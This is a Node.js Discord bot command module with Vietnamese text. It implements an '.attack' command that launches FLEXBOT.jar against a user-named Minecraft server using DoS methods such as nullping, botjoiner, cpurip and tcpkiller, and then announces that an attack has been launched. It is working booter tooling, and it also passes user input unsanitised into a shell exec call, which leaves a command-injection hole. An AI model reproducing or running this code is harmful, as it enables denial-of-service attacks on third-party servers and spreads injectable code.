const Discord = require("discord.js");
const disbut = require('discord.js-buttons')

exports.run = async (client, message, args) => {
const host = message.content.split (" ")[1]
const protocol = message.content.split (" ")[2]
const methods = message.content.split (" ")[3]
const prefix = message.content.split (" ")[4]
const chatbot = args.slice(4).join(" ");
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;
var version = ayarlar.versionbot;
var img = ayarlar.img;
var photo = ayarlar.photo;
const BannedWords = ["legendmulti.ga", "1.1.1.1"]

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công .attack 1.1.1.1 47 botjoiner`")
	message.channel.send(embed1);
	message.react('❌');
	return;
}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng chí ghi phiên bản BOT`")
	message.channel.send(embed1);
	message.react('❌');
	return;
}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Vui lòng ghi phương pháp Tấn Công`")
	message.channel.send(embed1);
	message.react('❌');
	return;
}

if(args[2] === "chat") {
	if (!args[3]) {
		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("Không thể xóa tin nhắn."));
			message.reply(`Máy chủ đã bị cấm.`)
			return;
		} 
		var chetmemay = methods.replace("chat", "chatbot");
		var miniflex = methods.replace("chat", "CHAT");
		var cmdrunbot = chatbot.split(' ').join('_');
		
		console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)
		
		var exec = require('child_process').exec
			exec(`java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 500`, (error, stdout, stderr) => {
		});

		let stop = new disbut.MessageButton()
			.setStyle('red')
			.setLabel("DỪNG LẠI")
			.setID('stop')
		
		const embed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle(version)
			.setDescription("Máy Chủ: `" + host + "` \n Phiên Bản: `" + protocol + "`\n \n Phương pháp: `" + miniflex + "💥`\n \n Tên BOT: `FLEX_B0T` \n Nội Dung CHAT: `Attack Premium | FlexBot is Best` \n Thời gian: `60 giây 🕒`")
			.setFooter('Tiền to thế này thơm là đúng', img)
			.setImage(photo)
		const countdownEmbed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle(version)
			.setDescription("ĐANG KIỂM TRA...")
			.setFooter('Tiền to thế này thơm là đúng', img)
	message.channel.send({ embed: countdownEmbed }).then((msg) => {
			setTimeout(function () {
				msg.edit(embed);
				message.react('✅');
			}, 3000)
		})
		return;
	}
	if (!chatbot) {
		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("Không thể xóa tin nhắn."));
			message.reply(`Máy chủ đã bị cấm.`)
			return;
		} 
		var chetmemay = methods.replace("chat", "chatbot");
		var miniflex = methods.replace("chat", "CHAT");
		var cmdrunbot = chatbot.split(' ').join('_');
		
		console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)
		
		var exec = require('child_process').exec
			exec(`prefix=${prefix} java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 500`, (error, stdout, stderr) => {
		});

		let stop = new disbut.MessageButton()
			.setStyle('red')
			.setLabel("DỪNG LẠI")
			.setID('stop')
		
		const embed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle(version)
			.setDescription("Máy Chủ: `" + host + "` \n Phiên Bản: `" + protocol + "`\n \n Phương pháp: `" + miniflex + "💥`\n \n Tên BOT: `" + prefix +"` \n Nội Dung CHAT: `Attack Premium | FlexBot is Best` \n Thời gian: `60 giây 🕒`")
			.setFooter('Tiền to thế này thơm là đúng', img)
			.setImage(photo)
		const countdownEmbed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle(version)
			.setDescription("ĐANG KIỂM TRA...")
			.setFooter('Tiền to thế này thơm là đúng', img)
	message.channel.send({ embed: countdownEmbed }).then((msg) => {
			setTimeout(function () {
				msg.edit(embed);
				message.react('✅');
			}, 3000)
		})
	} else {
		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("Không thể xóa tin nhắn."));
			message.reply(`Máy chủ đã bị cấm.`)
			return;
		} 
		var chetmemay = methods.replace("chat", "chatbot");
		var miniflex = methods.replace("chat", "CHAT");
		var cmdrunbot = chatbot.split(' ').join('_');
		
		console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)
		
		var exec = require('child_process').exec
			exec(`prefix=${prefix} messages=${cmdrunbot} java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 500`, (error, stdout, stderr) => {
		});

		let stop = new disbut.MessageButton()
			.setStyle('red')
			.setLabel("DỪNG LẠI")
			.setID('stop')
		
		const embed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle(version)
			.setDescription("Máy Chủ: `" + host + "` \n Phiên Bản: `" + protocol + "`\n \n Phương pháp: `" + miniflex + "💥`\n \n Tên BOT: `" + prefix + "` \n Nội Dung CHAT: `" + chatbot + "` \n Thời gian: `60 giây 🕒`")
			.setFooter('Tiền to thế này thơm là đúng', img)
			.setImage(photo)
		const countdownEmbed = new Discord.MessageEmbed()
			.setColor('RANDOM')
			.setTitle(version)
			.setDescription("ĐANG KIỂM TRA...")
			.setFooter('Tiền to thế này thơm là đúng', img)
	message.channel.send({ embed: countdownEmbed }).then((msg) => {
			setTimeout(function () {
				msg.edit(embed);
				message.react('✅');
			}, 3000)
		})
	}
	return;
}

if(args[2] === "tcpkiller" || args[2] === "spigot" || args[2] === "bye" || args[2] === "killnet" || args[2] === "cpurip" || args[2] === "overload" || args[2] === "cpudowner" || args[2] === "joinmotd" || args[2] === "botjoiner" || args[2] === "nullping" || args[2] === "bungeesmasher" || args[2] === "nettydowner" || args[2] === "join" || args[2] === "joinkiller" || args[2] === "aegis" || args[2] === "nantibot" || args[2] === "handshake") {

		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("Không thể xóa tin nhắn."));
			message.reply(`Máy chủ đã bị cấm.`)
			return;
		} 

		var chetmemay = methods.replace("overload", "botnet")
		   .replace("cpudowner", "cpudowner")
		   .replace("joinmotd", "multikiller")
		   .replace("botjoiner", "botjoiner")
		   .replace("nullping", "nullping")
		   .replace("bungeesmasher", "ultimatesmasher")
		   .replace("nettydowner", "nettydowner")
		   .replace("join", "localhost")
		   .replace("joinkiller", "joinkiller")
		   .replace("aegis", "yoonikscry")
		   .replace("nantibot", "nabcry")
		   .replace("handshake", "handshake")
		   .replace("killnet", "killnet")
		   .replace("bye", "ram")
		   .replace("spigot", "localhost")
		   .replace("tcpkiller", "tcpbypass")
		   .replace("cpurip", "cpurip");
			   
		var exec = require('child_process').exec
			exec(`java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 -1`, (error, stdout, stderr) => {
		});

	var miniflex = methods.replace("overload", "Overload")
	   .replace("cpudowner", "CpuDowner")
	   .replace("joinmotd", "Join + Motd")
	   .replace("botjoiner", "Bot Joiner")
	   .replace("nullping", "NullPing")
	   .replace("bungeesmasher", "BungeeSmasher")
	   .replace("nettydowner", "NettyDowner")
	   .replace("join", "Join")
	   .replace("joinkiller", "Join Killer")
	   .replace("aegis", "Aegis")
	   .replace("nantibot", "nAntiBot")
	   .replace("handshake", "Handshake")
	   .replace("killnet", "Kill Net")
	   .replace("bye", "Bye Bye")
	   .replace("spigot", "Spigot Downer")
	   .replace("tcpkiller", "TCP Killer")
	   .replace("cpurip", "Cpu RIP");
	console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)

	let stop = new disbut.MessageButton()
		.setStyle('red')
		.setLabel("DỪNG LẠI")
		.setID('stop')

	const embed = new Discord.MessageEmbed()
		.setColor('RANDOM')
		.setTitle('🌩️ **AN ATTACK HAS BEEN LAUNCH!**')
		.addFields(
		{ name: '👻‍ User:', value: `${message.author.username}`, inline: true },
    { name: '🔗 Server:', value: `${host}`, inline: true },
    { name: '🔒 Version:', value: `${protocol}`, inline: true },
    { name: '💥 Method:', value: `${miniflex}`, inline: true },
    { name: '🚀 Bot:', value: 'Unlimited', inline: true },
    { name: '⏰ Duration:', value: '60s', inline: true },
  )
		.setFooter('Tiền to thế này thơm là đúng', img)
                .setImage(`http://status.mclive.eu/FlexBot/${args[0]}/25565/banner.png`)
	const countdownEmbed = new Discord.MessageEmbed()
		.setColor('RANDOM')
		.setTitle(version)
		.setDescription("ĐANG KIỂM TRA...")
		.setFooter('Tiền to thế này thơm là đúng', img)
	message.channel.send({ embed: countdownEmbed }).then((msg) => {
			setTimeout(function () {
				msg.edit(embed);
				message.react('✅');
			}, 3000)
		})
	} else {
	 message.reply("Phương Pháp Tấn Công không tồn tại.");
	 message.react('❌');
	 return;
	}
}


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'Lệnh Tấn Công',
  usage: 'attack'
}
